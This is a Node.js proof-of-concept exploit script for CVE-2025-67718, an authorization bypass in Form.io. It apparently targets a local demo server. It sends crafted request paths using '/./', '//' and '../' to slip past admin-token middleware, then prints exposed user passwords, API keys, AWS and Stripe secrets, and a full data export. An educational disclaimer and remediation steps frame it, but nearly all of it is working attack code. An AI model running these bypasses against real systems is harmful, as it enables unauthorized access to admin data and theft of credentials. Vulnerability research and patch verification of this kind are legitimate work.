/**
 * CVE-2025-67718 Exploit / POC Tool
 * 
 * This tool demonstrates how to exploit the vulnerability in Form.io (≤ 3.5.6, ≤ 4.4.2)
 * to bypass authorization and access protected admin endpoints.
 * 
 * The exploit works by:
 * 1. Identifying protected admin endpoints
 * 2. Crafting URL-encoded or path traversal payloads
 * 3. Sending requests that bypass the authorization middleware
 * 4. Retrieving sensitive admin data without proper authentication
 */

const axios = require('axios');

const BASE_URL = 'http://localhost:3000';

// Color codes for terminal output
const colors = {
  reset: '\x1b[0m',
  bright: '\x1b[1m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m',
  white: '\x1b[37m'
};

function log(color, message) {
  console.log(`${colors[color]}${message}${colors.reset}`);
}

function header(message) {
  const line = '═'.repeat(70);
  log('cyan', '');
  log('cyan', line);
  log('bright', `  ${message}`);
  log('cyan', line);
  log('cyan', '');
}

function section(message) {
  log('blue', `\n${message}`);
}

/**
 * Display banner
 */
function displayBanner() {
  log('cyan', '');
  log('cyan', '═══════════════════════════════════════════════════════════════════');
  log('bright', '  CVE-2025-67718 - Exploit Tool');
  log('white', '  Unauthorized Permission Elevation via Crafted Request Path');
  log('white', '  Form.io ≤ 3.5.6, ≤ 4.4.2');
  log('cyan', '═══════════════════════════════════════════════════════════════════');
  log('yellow', '  ⚠️  FOR EDUCATIONAL PURPOSES ONLY');
  log('cyan', '═══════════════════════════════════════════════════════════════════');
  log('cyan', '');
}

/**
 * Test if server is running
 */
async function checkServer() {
  section('=== Server Health Check ===');
  
  try {
    const response = await axios.get(`${BASE_URL}/health`, { timeout: 5000 });
    log('green', '[+] Server is running');
    log('yellow', `[+] Status: ${response.data.status}`);
    log('yellow', `[+] Version: ${response.data.version}`);
    return true;
  } catch (error) {
    log('red', '[-] Server is not reachable!');
    log('red', `[-] Error: ${error.message}`);
    log('yellow', '[!] Please start the server with: npm start');
    return false;
  }
}

/**
 * Get vulnerability information
 */
async function getVulnerabilityInfo() {
  section('=== Vulnerability Information ===');
  
  try {
    const response = await axios.get(`${BASE_URL}/api/vulnerability-info`);
    const info = response.data;
    
    log('cyan', `[*] CVE: ${info.cve}`);
    log('cyan', `[*] Title: ${info.title}`);
    log('red', `[*] Severity: ${info.severity}`);
    log('yellow', `[*] Description: ${info.description}`);
    
    log('yellow', '\n[*] Exploit Methods:');
    info.exploitMethods.forEach(method => {
      log('white', `    - ${method}`);
    });
    
  } catch (error) {
    log('red', `[-] Failed to get vulnerability info: ${error.message}`);
  }
}

/**
 * Test legitimate access (should fail)
 */
async function testLegitimateAccess() {
  section('=== Testing Legitimate Access (Without Admin Token) ===');
  
  const endpoint = '/api/admin/users';
  
  try {
    log('blue', `[*] Attempting to access: ${endpoint}`);
    log('blue', `[*] Without X-Admin-Token header`);
    
    const response = await axios.get(`${BASE_URL}${endpoint}`);
    
    // If we get here, something is wrong
    log('red', '[!] WARNING: Access granted without authentication!');
    log('yellow', `[!] Response: ${JSON.stringify(response.data, null, 2)}`);
    
  } catch (error) {
    if (error.response && error.response.status === 403) {
      log('green', '[+] ✓ Access correctly denied (403 Forbidden)');
      log('yellow', `[+] Message: ${error.response.data.message}`);
    } else {
      log('red', `[-] Unexpected error: ${error.message}`);
    }
  }
}

/**
 * Test with valid admin token (should succeed)
 */
async function testWithValidToken() {
  section('=== Testing Access With Valid Admin Token ===');
  
  const endpoint = '/api/admin/users';
  const adminToken = 'secret-admin-token-2025';
  
  try {
    log('blue', `[*] Attempting to access: ${endpoint}`);
    log('blue', `[*] With valid X-Admin-Token: ${adminToken}`);
    
    const response = await axios.get(`${BASE_URL}${endpoint}`, {
      headers: {
        'X-Admin-Token': adminToken
      }
    });
    
    log('green', '[+] ✓ Access granted with valid token');
    log('yellow', `[+] Retrieved ${response.data.data.length} users`);
    
  } catch (error) {
    log('red', `[-] Unexpected error: ${error.message}`);
  }
}

/**
 * Exploit using dot-slash (./) path normalization
 */
async function exploitWithDotSlash() {
  header('EXPLOIT #1: Dot-Slash Path Normalization');
  
  const normalPath = '/api/admin/users';
  const craftedPath = '/api/./admin/users';  // Insert /./
  
  log('cyan', '[*] Technique: Inserting /./ in the path');
  log('blue', `[*] Normal path:  ${normalPath}`);
  log('magenta', `[*] Crafted path: ${craftedPath}`);
  log('yellow', '[*] Expected: Middleware checks "/api/./admin/users"');
  log('yellow', '[*]           Doesn\'t match "/api/admin/" → bypass!');
  log('yellow', '[*]           Express normalizes /./ → routes to /api/admin/users');
  
  try {
    log('blue', '\n[*] Sending exploit request...');
    
    const response = await axios.get(`${BASE_URL}${craftedPath}`);
    
    log('green', '\n[+] ✓✓✓ EXPLOIT SUCCESSFUL! ✓✓✓');
    log('green', '[+] Bypassed authorization without admin token!');
    log('yellow', `[+] Retrieved sensitive data from: ${response.data.endpoint}`);
    log('yellow', `[+] Number of users exposed: ${response.data.data.length}`);
    
    log('cyan', '\n[*] Sample of exposed data:');
    response.data.data.slice(0, 2).forEach(user => {
      log('white', `    - Username: ${user.username}`);
      log('white', `      Email: ${user.email}`);
      log('red', `      Password: ${user.password}`);
      log('red', `      API Key: ${user.apiKey}`);
    });
    
    return true;
    
  } catch (error) {
    if (error.response && error.response.status === 403) {
      log('red', '[-] Exploit failed - Access denied');
      log('yellow', `[-] Message: ${error.response.data.message}`);
    } else {
      log('red', `[-] Error: ${error.message}`);
    }
    return false;
  }
}

/**
 * Exploit using double slash (//)
 */
async function exploitWithDoubleSlash() {
  header('EXPLOIT #2: Double Slash Path');
  
  const craftedPath = '/api//admin/users';  // Double slash
  
  log('cyan', '[*] Technique: Double slash in path');
  log('magenta', `[*] Crafted path: ${craftedPath}`);
  log('yellow', '[*] Middleware sees: "/api//admin/users"');
  log('yellow', '[*] Doesn\'t match "/api/admin/" → bypass!');
  
  try {
    log('blue', '\n[*] Sending exploit request...');
    
    const response = await axios.get(`${BASE_URL}${craftedPath}`);
    
    log('green', '\n[+] ✓✓✓ EXPLOIT SUCCESSFUL! ✓✓✓');
    log('green', '[+] Double slash bypass worked!');
    log('yellow', `[+] Accessed: ${response.data.endpoint}`);
    
    return true;
    
  } catch (error) {
    if (error.response && error.response.status === 403) {
      log('yellow', '[-] Double slash did not bypass');
    } else {
      log('red', `[-] Error: ${error.message}`);
    }
    return false;
  }
}

/**
 * Exploit sensitive config endpoint
 */
async function exploitConfigEndpoint() {
  header('EXPLOIT #3: Accessing System Configuration');
  
  const craftedPath = '/api/./admin/config';
  
  log('cyan', '[*] Target: System configuration endpoint');
  log('magenta', `[*] Crafted path: ${craftedPath}`);
  
  try {
    log('blue', '\n[*] Sending exploit request...');
    
    const response = await axios.get(`${BASE_URL}${craftedPath}`);
    
    log('green', '\n[+] ✓✓✓ CRITICAL DATA EXPOSED! ✓✓✓');
    log('red', '[+] Retrieved sensitive system configuration!');
    
    log('cyan', '\n[*] Exposed credentials and secrets:');
    const config = response.data.data;
    log('red', `    Database URL: ${config.databaseUrl}`);
    log('red', `    Secret Key: ${config.secretKey}`);
    log('red', `    AWS Access Key: ${config.awsAccessKey}`);
    log('red', `    AWS Secret Key: ${config.awsSecretKey}`);
    log('red', `    Stripe API Key: ${config.stripeApiKey}`);
    log('red', `    SMTP Password: ${config.smtpPassword}`);
    
    return true;
    
  } catch (error) {
    if (error.response && error.response.status === 403) {
      log('red', '[-] Exploit failed - Access denied');
    } else {
      log('red', `[-] Error: ${error.message}`);
    }
    return false;
  }
}

/**
 * Exploit export endpoint (dump all data)
 */
async function exploitExportEndpoint() {
  header('EXPLOIT #4: Full Data Export');
  
  const craftedPath = '/api/./admin/export';
  
  log('cyan', '[*] Target: Data export endpoint');
  log('magenta', `[*] Crafted path: ${craftedPath}`);
  log('red', '[*] This will dump ALL sensitive data!');
  
  try {
    log('blue', '\n[*] Sending exploit request...');
    
    const response = await axios.get(`${BASE_URL}${craftedPath}`);
    
    log('green', '\n[+] ✓✓✓ FULL DATA DUMP SUCCESSFUL! ✓✓✓');
    log('red', '[+] Complete database export retrieved!');
    
    const data = response.data.data;
    log('yellow', `\n[+] Exported at: ${response.data.exportedAt}`);
    log('yellow', `[+] Total users: ${data.users.length}`);
    log('yellow', `[+] Configuration keys: ${Object.keys(data.config).length}`);
    log('yellow', `[+] Settings keys: ${Object.keys(data.settings).length}`);
    
    log('cyan', '\n[*] Sample of full export:');
    log('white', JSON.stringify(response.data, null, 2).substring(0, 500) + '...');
    
    return true;
    
  } catch (error) {
    if (error.response && error.response.status === 403) {
      log('red', '[-] Exploit failed - Access denied');
    } else {
      log('red', `[-] Error: ${error.message}`);
    }
    return false;
  }
}

/**
 * Test path traversal (alternative techniques)
 */
async function testPathTraversal() {
  header('EXPLOIT #5: Path Traversal Techniques');
  
  const paths = [
    '/api/foo/../admin/users',
    '/api/admin/../admin/users',
    '/api//admin/config'
  ];
  
  log('cyan', '[*] Technique: Path traversal and normalization');
  log('yellow', '[*] Testing multiple path variations...');
  
  for (const path of paths) {
    log('blue', `\n[*] Testing: ${path}`);
    
    try {
      const response = await axios.get(`${BASE_URL}${path}`);
      log('green', `[+] ✓ SUCCESS with path: ${path}`);
      log('yellow', `[+] Retrieved data from: ${response.data.endpoint}`);
      return true;
    } catch (error) {
      if (error.response && error.response.status === 403) {
        log('yellow', `[-] Blocked: ${path}`);
      } else {
        log('red', `[-] Error: ${error.message}`);
      }
    }
  }
  
  log('yellow', '\n[!] Path traversal variations were tested');
  return false;
}

/**
 * Summary of exploits
 */
function displaySummary(results) {
  header('EXPLOIT SUMMARY');
  
  log('cyan', '[*] Exploit Results:');
  
  const techniques = [
    { name: 'Dot-Slash (/./) Path', success: results.dotSlash },
    { name: 'Double Slash (//)', success: results.doubleSlash },
    { name: 'Config Access', success: results.configAccess },
    { name: 'Full Data Export', success: results.dataExport },
    { name: 'Path Traversal (/../)', success: results.pathTraversal }
  ];
  
  techniques.forEach(tech => {
    const status = tech.success ? '✓ SUCCESS' : '✗ FAILED';
    const color = tech.success ? 'green' : 'red';
    log(color, `    ${status} - ${tech.name}`);
  });
  
  const successCount = techniques.filter(t => t.success).length;
  const totalCount = techniques.length;
  
  log('cyan', `\n[*] Success Rate: ${successCount}/${totalCount} exploits successful`);
  
  if (successCount > 0) {
    log('red', '\n[!] VULNERABILITY CONFIRMED: CVE-2025-67718');
    log('red', '[!] Server is vulnerable to authorization bypass!');
    log('yellow', '\n[!] Recommended Actions:');
    log('yellow', '    1. Update Form.io to version >= 3.5.7 or >= 4.4.3');
    log('yellow', '    2. Update formio-server to >= 8.5.8 or >= 9.4.3');
    log('yellow', '    3. Implement proper path normalization before authorization checks');
    log('yellow', '    4. Review and audit all protected endpoints');
    log('yellow', '    5. Check logs for suspicious encoded path requests');
  } else {
    log('green', '\n[+] Server appears to be patched or not vulnerable');
  }
}

/**
 * Main execution
 */
async function main() {
  displayBanner();
  
  // Check if server is running
  const serverRunning = await checkServer();
  if (!serverRunning) {
    process.exit(1);
  }
  
  // Get vulnerability info
  await getVulnerabilityInfo();
  
  // Wait a bit
  await new Promise(resolve => setTimeout(resolve, 1000));
  
  // Test legitimate access
  await testLegitimateAccess();
  
  // Wait a bit
  await new Promise(resolve => setTimeout(resolve, 1000));
  
  // Test with valid token
  await testWithValidToken();
  
  // Wait a bit
  await new Promise(resolve => setTimeout(resolve, 1000));
  
  // Execute exploits
  const results = {
    dotSlash: await exploitWithDotSlash(),
    doubleSlash: await exploitWithDoubleSlash(),
    configAccess: await exploitConfigEndpoint(),
    dataExport: await exploitExportEndpoint(),
    pathTraversal: await testPathTraversal()
  };
  
  // Display summary
  displaySummary(results);
  
  log('cyan', '\n═══════════════════════════════════════════════════════════════════');
  log('yellow', '  Exploit demonstration complete');
  log('red', '  ⚠️  Remember: Use responsibly and ethically!');
  log('cyan', '═══════════════════════════════════════════════════════════════════');
  log('cyan', '');
}

// Handle errors
process.on('unhandledRejection', (error) => {
  log('red', `\n[!] Unhandled error: ${error.message}`);
  process.exit(1);
});

// Run
main().catch(error => {
  log('red', `\n[!] Fatal error: ${error.message}`);
  process.exit(1);
});
